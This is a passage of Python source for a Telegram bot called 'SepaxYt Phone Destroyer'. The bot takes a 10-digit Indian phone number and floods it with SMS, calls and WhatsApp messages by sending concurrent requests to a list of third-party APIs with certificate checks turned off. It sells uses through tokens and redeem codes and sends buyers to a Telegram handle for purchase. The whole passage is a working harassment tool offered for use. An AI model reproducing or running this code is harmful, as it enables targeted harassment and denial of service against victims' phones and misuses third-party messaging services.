        self.stats["start_time"] = time.time()
        
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                task = asyncio.create_task(self.bomb_phone(session, api, phone))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def stop(self):
        self.running = False

destroyer = PhoneDestroyer()

# ============ TELEGRAM BOT HANDLERS ============
app = Application.builder().token(BOT_TOKEN).build()

def is_admin(user_id):
    return user_id in ADMIN_IDS or user_id == OWNER_ID

async def check_channel(update: Update):
    user_id = update.effective_user.id
    channels = db.get_channels()
    
    for channel in channels:
        try:
            member = await app.bot.get_chat_member(channel, user_id)
            if member.status in ['member', 'administrator', 'creator']:
                return True
        except:
            continue
    
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    
    # Check channel
    if not await check_channel(update):
        channels = db.get_channels()
        keyboard = []
        for channel in channels:
            keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=f"https://t.me/{channel.replace('@','')}")])
        keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data='check_join')])
        
        await update.message.reply_text(
            f"🔒 **CHANNEL REQUIRED**\n\n"
            f"Hey {user.first_name}! You need to join our channels first:\n\n"
            f"📢 Join all channels below to use this bot:\n",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    user_data = db.get_user(user.id)
    keyboard = [
        [InlineKeyboardButton("💀 START BOMBING", callback_data='start_bomb')],
        [InlineKeyboardButton("🛑 STOP BOMBING", callback_data='stop_bomb')],
        [InlineKeyboardButton("📊 MY STATUS", callback_data='status')],
        [InlineKeyboardButton("🎯 TARGETS", callback_data='targets')],
        [InlineKeyboardButton("💰 REDEEM CODE", callback_data='redeem')],
        [InlineKeyboardButton("📈 STATS", callback_data='stats')],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data='admin_panel')] if is_admin(user.id) else [],
        [InlineKeyboardButton("ℹ️ HELP", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"💀 **SEPAXYT PHONE DESTROYER**\n\n"
        f"👤 **User:** {user.first_name}\n"
        f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
        f"📞 **Used:** {user_data[3] if user_data else 0}\n"
        f"📱 **Phone:** Only Indian (+91)\n\n"
        f"⚡ **APIs Loaded:** {len(ULTIMATE_APIS)}\n"
        f"🔥 **Status:** {'🟢 ACTIVE' if destroyer.running else '🔴 IDLE'}\n\n"
        f"💡 Use /help for commands",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    if query.data == 'check_join':
        if await check_channel(update):
            await query.edit_message_text("✅ **Joined Successfully!**\nUse /start again.")
        else:
            await query.edit_message_text("❌ **Join all channels first!**")
        return
    
    if query.data == 'start_bomb':
        if destroyer.running:
            await query.edit_message_text("⚠️ **Bombing already running!**")
            return
        
        context.user_data['bombing'] = True
        await query.edit_message_text("📞 **Enter 10-digit Indian phone number:**")
        context.user_data['awaiting_phone'] = True
    
    elif query.data == 'stop_bomb':
        destroyer.stop()
        await query.edit_message_text("🛑 **Bombing stopped!**")
    
    elif query.data == 'status':
        await show_user_status(query)
    
    elif query.data == 'targets':
        await show_targets(query)
    
    elif query.data == 'redeem':
        await query.edit_message_text("🎯 **Enter redeem code:**")
        context.user_data['awaiting_redeem'] = True
    
    elif query.data == 'stats':
        await show_global_stats(query)
    
    elif query.data == 'admin_panel':
        if is_admin(user_id):
            await admin_panel(query)
    
    elif query.data == 'help':
        await show_help(query)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if context.user_data.get('awaiting_phone'):
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text("❌ **Invalid number!** Enter 10 digits only.")
            return
        
        user_data = db.get_user(user_id)
        if user_data[2] < 1:
            await update.message.reply_text("❌ **Insufficient tokens!** Buy tokens from @LuaFucker")
            return
        
        context.user_data['awaiting_phone'] = False
        db.update_tokens(user_id, -1)
        
        await update.message.reply_text(f"💀 **Bombing started on +91{text}**\n🔄 It will run continuously!")
        
        threading.Thread(target=lambda: asyncio.run(destroyer.start_destruction(text, user_id))).start()
    
    elif context.user_data.get('awaiting_redeem'):
        context.user_data['awaiting_redeem'] = False
        tokens = db.redeem_code(text.upper(), user_id)
        if tokens:
            await update.message.reply_text(f"✅ **Redeemed successfully!**\n🪙 +{tokens} tokens added!")
        else:
            await update.message.reply_text("❌ **Invalid or already used code!**")

async def show_user_status(query):
    user_data = db.get_user(query.from_user.id)
    elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
    
    await query.edit_message_text(
        f"📊 **YOUR STATUS**\n\n"
        f"🪙 **Tokens:** {user_data[2]}\n"
        f"📞 **Total Used:** {user_data[3]}\n"
        f"🔥 **Bomber Status:** {'🟢 ACTIVE' if destroyer.running else '🔴 IDLE'}\n"
        f"📱 **Current Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
        f"📞 **Calls:** {destroyer.stats['calls_sent']}\n"
        f"📱 **WhatsApp:** {destroyer.stats['whatsapp_sent']}\n"
        f"💬 **SMS:** {destroyer.stats['sms_sent']}\n"
        f"💥 **Hits:** {destroyer.stats['successful_hits']}\n"
        f"⏰ **Uptime:** {int(elapsed//60)}m\n"
        f"⚡ **APIs:** {destroyer.stats['active_apis']}",
        parse_mode='Markdown'
    )

async def show_targets(query):
    targets = db.get_targets()
    if not targets:
        await query.edit_message_text("📋 **No targets in queue!**")
        return
    
    target_list = "\n".join([f"📞 +91{t}" for t in targets[:10]])
    await query.edit_message_text(
        f"📋 **TARGET QUEUE**\n\n{target_list}\n\n📊 Total: {len(targets)}",
        parse_mode='Markdown'
    )

async def show_global_stats(query):
    await query.edit_message_text(
        f"📊 **GLOBAL STATS**\n\n"
        f"👤 **Users:** {db.cursor.execute('SELECT COUNT(*) FROM users').fetchone()[0]}\n"
        f"📞 **Total SMS/Calls:** {destroyer.stats['total_requests']}\n"
        f"💥 **Successful Hits:** {destroyer.stats['successful_hits']}\n"
        f"⚡ **Active APIs:** {len(ULTIMATE_APIS)}\n"
        f"🎯 **Targets:** {len(db.get_targets())}\n"
        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}",
        parse_mode='Markdown'
    )

async def admin_panel(query):
    if not is_admin(query.from_user.id):
        await query.edit_message_text("❌ **Admin access only!**")
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ ADD CHANNEL", callback_data='add_channel')],
        [InlineKeyboardButton("📋 CHANNELS LIST", callback_data='channels_list')],
        [InlineKeyboardButton("🪙 CREATE REDEEM CODE", callback_data='create_redeem')],
        [InlineKeyboardButton("👥 USERS LIST", callback_data='users_list')],
        [InlineKeyboardButton("💰 ADD TOKENS", callback_data='add_tokens')],
        [InlineKeyboardButton("📊 FULL STATS", callback_data='full_stats')],
        [InlineKeyboardButton("🔙 BACK", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        f"👑 **ADMIN PANEL**\n\n"
        f"Welcome {query.from_user.first_name}!",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def show_help(query):
    await query.edit_message_text(
        f"📖 **COMMANDS**\n\n"
        f"/start - Start bot\n"
        f"/bomb [number] - Bomb a number\n"
        f"/stop - Stop bombing\n"
        f"/status - Your status\n"
        f"/tokens - Check tokens\n"
        f"/redeem [code] - Redeem code\n"
        f"/targets - Target list\n"
        f"/addtarget [number] - Add target\n"
        f"/admin - Admin panel\n\n"
        f"💡 **Buy Tokens:** @LuaFucker",
        parse_mode='Markdown'
    )

# ============ FLASK SERVER FOR RENDER ============
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "💀 SepaxYt Bomber is Alive!"

@flask_app.route('/webhook', methods=['POST'])
def webhook():
    return "OK"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080)

# ============ MAIN ============
def main():
    # Setup handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", lambda u,c: destroyer.stop()))
    app.add_handler(CommandHandler("status", lambda u,c: asyncio.create_task(show_user_status(u.message))))
    app.add_handler(CommandHandler("targets", lambda u,c: asyncio.create_task(show_targets(u.message))))
    app.add_handler(CommandHandler("redeem", lambda u,c: db.redeem_code(c.args[0] if c.args else '', u.effective_user.id)))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start Flask server in background
    threading.Thread(target=run_flask, daemon=True).start()
    
    print("💀 SepaxYt Bomber Started!")
    print(f"🤖 Bot: @{app.bot.username}")
    print(f"👑 Owner: {OWNER_ID}")
    print(f"⚡ APIs: {len(ULTIMATE_APIS)}")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()